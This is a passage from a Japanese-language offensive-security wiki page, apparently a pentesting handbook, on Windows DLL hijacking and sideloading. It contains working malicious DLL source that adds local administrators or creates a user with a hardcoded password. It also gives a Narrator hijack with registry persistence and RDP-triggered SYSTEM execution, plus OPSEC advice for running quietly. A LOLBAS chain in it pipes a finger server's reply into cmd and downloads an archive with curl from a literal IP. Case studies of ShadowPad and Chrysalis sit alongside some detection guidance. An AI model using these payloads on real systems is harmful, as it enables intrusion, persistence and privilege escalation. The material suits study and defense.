        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>ユーザー作成を行う C++ DLL の例</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>スレッドエントリを備えた別のC DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### export による初期化をトリガーする NativeAOT DLL

自己完結型の **.NET NativeAOT 共有ライブラリ**は、明示的な `DllMain` を実装せずに、配置するネイティブ DLL として使用できます。`[UnmanagedCallersOnly(EntryPoint = "...")]` を指定して静的 C# メソッドをエクスポートします。ネイティブホストがコンパイラー生成のエントリーポイントのいずれかを呼び出すと、NativeAOT がモジュールを初期化し、エクスポートされた C# の本体が実行される前に `[ModuleInitializer]` メソッドが実行されます。出力の実行に、別途インストールされた .NET ランタイムは必要ありません。<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

DLL には、選択したホストが実際に呼び出す **エクスポート名と ABI 互換のシグネチャ**が必要です。初期化をトリガーするだけなら最小限のスタブで十分な場合もありますが、エクスポートが不足していると読み込みに失敗することがあり、シグネチャが正しくないと呼び出し時にデータが破損する可能性があります。ホストのインポートを列挙し、出力ファイルの名前をホストが想定する依存 DLL 名に変更する前に、`dumpbin /exports payload.dll` で結果を検証してください。<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>最小限の NativeAOT エクスポート DLL</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

プロジェクトを自己完結型の Windows ネイティブ共有ライブラリとして構成します。<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

名前を変更した DLL をコピーした脆弱な実行ファイルの隣に配置し、互換性のある export を呼び出すコードパスからホストを起動します。この initializer アプローチでは、複雑な処理を `DllMain` に直接記述せずに済みますが、sideload の前提条件は変わりません。loader が依存関係を名前で解決し、アプリケーションディレクトリを選択し、KnownDLLs、すでに読み込まれたモジュール、SxS redirection、または制限付きの `LOAD_LIBRARY_SEARCH_*` flags によって先に依存関係が解決されない必要があります。<sup>[[26]](#references)[[30]](#references)</sup>

従来型の native template については、[Windows C payloads](../windows-c-payloads.md) を参照してください。sideload された first stage は、その後 [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe) を実行する場合がありますが、これは DLL 解決の一部ではなく、別の injection technique です。

## Detection: DLL masquerading による library load

Elastic Defend 9.5.0 は、読み込まれたファイルが Microsoft 署名ではなく、そのファイル名が Elastic のキャッシュ済み Windows/system DLL 名 inventory と衝突する場合、library-load event に `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` を追加します。これにより、ファイル名 inventory、システム上の場所、署名の分析が endpoint sensor 側で行われるため、コア EQL は次のように簡略化できます。<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

この enrichment は、それ自体を証明と見なすのではなく、価値の高い pivot として扱ってください。署名済みのホストが自身の**ユーザー書き込み可能な**ディレクトリから DLL を読み込み、その DLL が未署名または信頼されておらず、`dll.Ext.relative_file_creation_time` によって読み込み直前に作成されたことが示される場合は、確信度を高めます。除外範囲は、正確な publisher + host process + installation path に限定してください。正規のインストーラーやアプリケーションがシステムに似た名前のプライベートライブラリを同梱する場合があるため、衝突する DLL 名をグローバルに抑制しないでください。<sup>[[26]](#references)</sup>

この enrichment がないセンサーでは、衝突する DLL 名を、システム以外の読み込みパス、Microsoft 署名の欠如または信頼できない署名、および短いファイル作成から読み込みまでの間隔と関連付けることで、動作を近似できます。そのためには、DLL 名のインベントリを継続的に管理し、`%SystemRoot%\\System32`、`SysWOW64`、`WinSxS`、その他の承認済みデプロイパスに対する限定的な除外が必要です。<sup>[[26]](#references)</sup>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe は、起動時に予測可能な言語固有の localization DLL を引き続き検索します。この DLL は hijack されると、任意のコード実行と永続化が可能になります。<sup>[[7]](#references)</sup>

主な事実
- Probe path (現行ビルド): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US)。
- Legacy path (旧ビルド): `%windir%\System32\speech\engine\tts\msttslocenus.dll`。
- OneCore path に書き込み可能な攻撃者制御の DLL が存在する場合、読み込まれて `DllMain(DLL_PROCESS_ATTACH)` が実行されます。エクスポートは不要です。

Procmon による検出
- フィルター: `Process Name is Narrator.exe` および `Operation is Load Image` または `CreateFile`。
- Narrator を起動し、上記パスの読み込み試行を確認します。

最小限の DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSECでの静音化
- 素朴な hijack は音声を出したり、UI を強調表示したりします。静かに実行するには、attach 時に Narrator のスレッドを列挙し、メインスレッドを開いて（`OpenThread(THREAD_SUSPEND_RESUME)`）、そのスレッドを `SuspendThread` で一時停止します。処理は自分のスレッドで続行します。コード全体は PoC を参照してください。<sup>[[8]](#references)</sup>

Accessibility の構成を介した起動と永続化
- ユーザーコンテキスト（HKCU）: `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM（HKLM）: `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記の設定により、Narrator の起動時に仕込んだ DLL が読み込まれます。セキュアデスクトップ（ログオン画面）で CTRL+WIN+ENTER を押して Narrator を起動すると、セキュアデスクトップ上で DLL が SYSTEM として実行されます。

RDP によって起動する SYSTEM 実行（lateral movement）
- 従来の RDP セキュリティレイヤーを許可します: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストに RDP 接続し、ログオン画面で CTRL+WIN+ENTER を押して Narrator を起動すると、セキュアデスクトップ上で DLL が SYSTEM として実行されます。
- RDP セッションを閉じると実行が停止するため、速やかに inject/migrate してください。

Bring Your Own Accessibility (BYOA)
- 組み込みの Accessibility Tool（AT）のレジストリエントリ（例: CursorIndicator）を複製し、任意のバイナリ/DLL を指すように編集してインポートした後、`configuration` にその AT 名を設定できます。これにより、Accessibility フレームワークを介して任意の実行を中継できます。

注意事項
- `%windir%\System32` への書き込みと HKLM 値の変更には、管理者権限が必要です。
- ペイロードのロジックはすべて `DLL_PROCESS_ATTACH` に配置できます。exports は不要です。

## 事例: CVE-2025-1729 - TPQMAssistant.exe を利用した権限昇格

この事例では、Lenovo の TrackPoint Quick Menu（`TPQMAssistant.exe`）における **Phantom DLL Hijacking** を紹介します。この脆弱性は **CVE-2025-1729** として追跡されています。<sup>[[2]](#references)[[3]](#references)</sup>

### 脆弱性の詳細

- **コンポーネント**: `C:\ProgramData\Lenovo\TPQM\Assistant\` にある `TPQMAssistant.exe`。
- **スケジュールされたタスク**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` は、ログオン中のユーザーのコンテキストで毎日午前 9:30 に実行されます。
- **ディレクトリのアクセス許可**: `CREATOR OWNER` に書き込みが許可されているため、ローカルユーザーは任意のファイルを配置できます。
- **DLL の検索動作**: 作業ディレクトリから最初に `hostfxr.dll` の読み込みを試み、ファイルが見つからない場合に「NAME NOT FOUND」と記録します。これは、ローカルディレクトリが検索で優先されることを示しています。

### Exploit の実装

攻撃者は、同じディレクトリに悪意のある `hostfxr.dll` のスタブを配置できます。これにより、見つからない DLL を悪用し、ユーザーのコンテキストでコードを実行できます:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### 攻撃の流れ

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置します。
2. 現在のユーザーのコンテキストで、スケジュールされたタスクが午前9時30分に実行されるのを待ちます。
3. タスクの実行時に管理者がログインしている場合、悪意のある DLL は管理者のセッションで中程度の整合性レベルで実行されます。
4. 標準的な UAC bypass 技術を組み合わせ、中程度の整合性レベルから SYSTEM 権限へ昇格します。

## 事例: MSI CustomAction Dropper + 署名済み Host（wsc_proxy.exe）を介した DLL Side-Loading

脅威アクターは、信頼された署名済みプロセスの下で payload を実行するため、MSI ベースの dropper と DLL side-loading を頻繁に組み合わせます。<sup>[[10]](#references)</sup>

概要
- ユーザーが MSI をダウンロードします。GUI インストール中に CustomAction がサイレントに実行され（例: LaunchApplication または VBScript アクション）、埋め込みリソースから次のステージを再構成します。
- Dropper は、正規の署名済み EXE と悪意のある DLL を同じディレクトリに書き込みます（組み合わせの例: Avast 署名済みの wsc_proxy.exe + 攻撃者が制御する wsc.dll）。
- 署名済み EXE が起動すると、Windows の DLL 検索順序により作業ディレクトリ内の wsc.dll が最初に読み込まれ、署名済みの親プロセスの下で攻撃者のコードが実行されます（ATT&CK T1574.001）。

MSI の分析（確認する点）
- CustomAction テーブル:
  - 実行ファイルまたは VBScript を実行するエントリを探します。疑わしいパターンの例: LaunchApplication が埋め込みファイルをバックグラウンドで実行する。
  - Orca（Microsoft Orca.exe）で、CustomAction、InstallExecuteSequence、Binary テーブルを調べます。
- MSI CAB 内の埋め込み/分割 payload:
  - 管理者向けの展開: msiexec /a package.msi /qb TARGETDIR=C:\out
  - または lessmsi を使用: lessmsi x package.msi C:\out
  - VBScript CustomAction によって連結・復号される複数の小さな断片を探します。一般的な流れ:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

wsc_proxy.exe を使った実践的な sideloading
- 次の2つのファイルを同じフォルダーに配置します:
  - wsc_proxy.exe: 正規の署名済みホスト (Avast)。プロセスは自身のディレクトリから名前で wsc.dll の読み込みを試みます。
  - wsc.dll: 攻撃者の DLL。特定の exports が不要であれば、DllMain だけで十分です。それ以外の場合は、proxy DLL を作成して必要な exports を本物のライブラリに転送しつつ、DllMain で payload を実行します。
- 最小限の DLL payload を作成します:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- export 要件を満たすには、proxying framework（例：DLLirant/Spartacus）を使用して、payload も実行する forwarding DLL を生成します。

- この手法は、ホストバイナリによる DLL 名の解決に依存します。ホストが絶対パスや安全な読み込みフラグ（例：LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用している場合、hijack に失敗することがあります。
- KnownDLLs、SxS、forwarded exports は優先順位に影響するため、ホストバイナリと export set の選定時に考慮する必要があります。

## 署名済みトライアド + 暗号化 payload（ShadowPad のケーススタディ）

Check Point は、Ink Dragon が**3 ファイルのトライアド**を使用して ShadowPad を展開し、正規ソフトウェアに紛れ込ませながら、コア payload をディスク上で暗号化したままにする手法を紹介しています：<sup>[[12]](#references)</sup>

1. **署名済みホスト EXE** – AMD、Realtek、NVIDIA などのベンダーが悪用されます（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者は実行ファイルの名前を Windows バイナリに見えるように変更します（例：`conhost.exe`）。ただし、Authenticode 署名は有効なままです。
2. **悪意のある loader DLL** – EXE と同じ場所に、想定される名前で配置されます（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。この DLL は通常、ScatterBrain framework で難読化された MFC バイナリで、暗号化 blob を見つけて復号し、ShadowPad を reflectively map することだけを担います。
3. **暗号化 payload blob** – 多くの場合、同じディレクトリに `<name>.tmp` として保存されます。復号した payload をメモリに map した後、loader は TMP ファイルを削除してフォレンジック証拠を消します。

Tradecraft に関する注意点：

* 署名済み EXE の名前を変更し（PE header の元の `OriginalFileName` は保持）、Windows バイナリを装いながらベンダー署名を維持できます。そのため、Ink Dragon の手口を再現するなら、実際には AMD/NVIDIA のユーティリティである `conhost.exe` 風のバイナリを配置します。
* 実行ファイルは信頼された状態を保つため、多くの allowlisting 制御では、悪意のある DLL をその隣に置くだけで済みます。loader DLL のカスタマイズに注力しましょう。署名済みの親プロセスは通常、そのまま実行できます。
* ShadowPad の decryptor は、TMP blob が loader の隣にあり、map 後にファイルをゼロ化できるよう書き込み可能であることを前提としています。payload が読み込まれるまでディレクトリを書き込み可能にしておきましょう。メモリ上に展開された後は、OPSEC のため TMP ファイルを安全に削除できます。

### LOLBAS stager + 段階的アーカイブ sideloading チェーン（finger → tar/curl → WMI）

攻撃者は DLL sideloading と LOLBAS を組み合わせ、ディスク上の独自 artifact を、信頼された EXE の隣に置く悪意のある DLL だけにします：<sup>[[1]](#references)</sup>

- **リモートコマンド loader（Finger）：** Hidden PowerShell が `cmd.exe /c` を起動し、Finger server からコマンドを取得して `cmd` にパイプします：

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` は TCP/79 のテキストを取得します。`| cmd` を使うとサーバーの応答を実行できるため、オペレーターはサーバー側で second stage を切り替えられます。

- **組み込みのダウンロード／展開:** 無害な拡張子のアーカイブをダウンロードして展開し、ランダムな `%LocalAppData%` フォルダーに sideload のターゲットと DLL を配置します。

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` は進行状況を非表示にしてリダイレクトを追跡します。`tar -xf` は Windows 標準の tar を使用します。

- **WMI/CIM による起動:** WMI 経由で EXE を起動します。これにより、EXE が同じディレクトリにある DLL を読み込む際、telemetry には CIM が作成したプロセスとして記録されます。

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - ローカル DLL を優先するバイナリ（例: `intelbq.exe`、`nearby_share.exe`）で有効。payload（例: Remcos）は信頼された名前で実行される。

- **探索:** `/p`、`/m`、`/c` が同時に指定された `forfiles` をアラート対象にする。管理者用スクリプト以外では珍しい。


## ケーススタディ: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

最近の Lotus Blossom の侵入では、信頼された更新チェーンを悪用し、DLL sideload と完全にメモリ上で実行される payload を仕込む NSIS-packed dropper を配布しました。<sup>[[13]](#references)</sup>

攻撃手法の流れ
- `update.exe` (NSIS) は `%AppData%\Bluetooth` を作成して **HIDDEN** に設定し、名前を変更した Bitdefender Submission Wizard の `BluetoothService.exe`、悪意のある `log.dll`、暗号化された blob `BluetoothService` を配置してから EXE を起動する。
- ホスト EXE は `log.dll` をインポートし、`LogInit`/`LogWrite` を呼び出す。`LogInit` は blob を mmap で読み込み、`LogWrite` は独自の LCG ベースのストリーム暗号（定数 **0x19660D** / **0x3C6EF35F**、鍵素材は以前の hash から導出）で復号し、バッファを平文の shellcode で上書きして一時データを解放し、shellcode にジャンプする。
- IAT を避けるため、loader は **FNV-1a basis 0x811C9DC5 + prime 0x1000193** で export 名を hash し、Murmur 形式の avalanche (**0x85EBCA6B**) を適用して、salt を加えたターゲット hash と比較して API を解決する。

メイン shellcode (Chrysalis)
- 5 回のパスで鍵 `gQ2JR&9;` を使って加算/XOR/減算を繰り返し、PE に似たメインモジュールを復号した後、`Kernel32.dll` → `GetProcAddress` を動的にロードして import 解決を完了する。
- 文字ごとの bit-rotate/XOR 変換を使って実行時に DLL 名の文字列を再構成し、`oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32` をロードする。
- 2 つ目の resolver は **PEB → InMemoryOrderModuleList** をたどり、各 export table を 4-byte ブロック単位で解析して Murmur 形式の mixing を行う。hash が見つからない場合に限り `GetProcAddress` にフォールバックする。

埋め込み configuration と C2
- configuration はドロップされた `BluetoothService` ファイル内の **offset 0x30808**（size **0x980**）にあり、鍵 `qwhvb^435h&*7` で RC4 復号すると C2 URL と User-Agent が得られる。
- beacon はドット区切りの host profile を作成し、タグ `4Q` を先頭に付けてから、鍵 `vAuig34%^325hGV` で RC4 暗号化し、HTTPS 経由で `HttpSendRequestA` を実行する。レスポンスは RC4 復号され、タグによる switch で処理される（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）。
- 実行モードは CLI args で制御される。引数なしの場合は `-i` を指定した service/Run key persistence をインストールし、`-i` は自身を `-k` 付きで再起動し、`-k` はインストールをスキップして payload を実行する。

確認された別の loader
- 同じ侵入では Tiny C Compiler もドロップし、`C:\ProgramData\USOShared\` から `svchost.exe -nostdlib -run conf.c` を実行し、隣に `libtcc.dll` を配置した。攻撃者が用意した C source には shellcode が埋め込まれており、コンパイル後にメモリ上で実行されたため、PE がディスクに書き込まれることはなかった。次のように再現できる:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- このTCCベースのコンパイル・実行ステージでは、実行時に `Wininet.dll` をインポートし、ハードコードされたURLから第2段階のshellcodeを取得していたため、コンパイラーの実行を装う柔軟なloaderとなっていました。

## Signed-host sideloading with export proxying + host thread parking

一部のDLL sideloadingチェーンでは、悪意のあるDLLの読み込み後にクラッシュするのではなく、後続ステージを正常に読み込めるよう、正規のhostを十分な時間稼働させる**安定性のための工夫**が加えられています。<sup>[[11]](#references)</sup>

確認されたパターン
- 信頼されたEXEを、`version.dll` など、依存関係で想定される名前の悪意のあるDLLと同じディレクトリに配置する。
- 悪意のあるDLLは、想定されるすべてのexportを実際のシステムDLL（例: `%SystemRoot%\\System32\\version.dll`）にproxyし、importの解決を成功させてhostプロセスの動作を維持する。
- 読み込み後、悪意のあるDLLはhostのentry pointにパッチを適用し、メインスレッドが終了したりプロセスを終了させるコードパスを実行したりせず、無限の `Sleep` ループに入るようにする。
- 新しいスレッドが実際の悪意ある処理を行う。次段階のDLL名やパスを復号（RC4/XORが一般的）し、`LoadLibrary` で起動する。

重要な理由
- 通常のDLL proxyingはAPI互換性を維持しますが、後続ステージに必要な時間だけhostが稼働し続ける保証はありません。
- メインスレッドを `Sleep(INFINITE)` で待機させるのは、worker threadが復号、staging、ネットワークbootstrapを行う間、署名済みプロセスを常駐させる簡単な方法です。
- 不審な `DllMain` だけを探していると、hostのentry pointへのパッチ適用後に不審な動作が発生し、二次スレッドが起動するこのパターンを見逃す可能性があります。

最小限の手順
1. 署名済みhost EXEをコピーし、ローカルディレクトリから読み込まれるDLLを特定する。
2. 同じ関数をexportし、正規のDLLに転送するproxy DLLを作成する。
3. `DllMain(DLL_PROCESS_ATTACH)` でworker threadを作成する。
4. そのスレッドからhostのentry pointまたはメインスレッドの開始ルーチンにパッチを適用し、`Sleep` ループに入るようにする。
5. 次段階のDLL名/configを復号し、`LoadLibrary` を呼び出すか、payloadをmanual-mapする。

防御上の着眼点
- 署名済みプロセスが、`System32` ではなく自身のアプリケーションディレクトリから `version.dll` などの一般的なライブラリを読み込んでいる。
- イメージの読み込み直後に発生する、プロセスentry pointへのメモリパッチ。特に、`Sleep`/`SleepEx` へリダイレクトするjump/call。
- proxy DLLが作成したスレッドが、復号された名前を持つ2つ目のDLLに対して直ちに `LoadLibrary` を呼び出す。
- `ProgramData`、`%TEMP%`、展開されたアーカイブのパスなど、書き込み可能なstagingディレクトリ内でベンダーの実行ファイルの隣に配置された、すべてのexportを備えるproxy DLL。

## References

- [1] [Red Canary – 2026年1月のインテリジェンス分析](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exeを使用した権限昇格](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – WindowsでのDLL hijacking。シンプルなCの例。](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticoreが欧州を標的とする新たなマルウェアを展開](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL HijackとWindowsヘルパーが出会うとき](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – デジタルな瓜二つ: Gh0st RATを配布する進化するなりすましキャンペーンの構造](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – 利害の収束: 東南アジア政府を標的とする脅威クラスターの分析](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragonの内部: ステルス性の高い攻撃作戦における中継ネットワークと内部動作を解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossomのツールキットを詳しく解説](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijackチェーン](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – イランのAPT Screening Serpensによる2026年の諜報キャンペーンを追跡](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – 猛スピードで展開: イラン紛争中のNimbus Manticoreの活動](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062、東南アジアの政府機関と重要インフラを標的に](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Elastic Defend 9.5.0によるWindows DLL検索順序hijackingの再構築と検出](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Native AOTを使用したnativeライブラリのビルド](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native AOTによるnative export](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Dynamic-link libraryの検索順序](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – PE形式](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – 正規ソフトウェアに埋め込まれたSectopRAT亜種を解明](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – LIGHTSHOWを盗む（第1部）](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operation FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
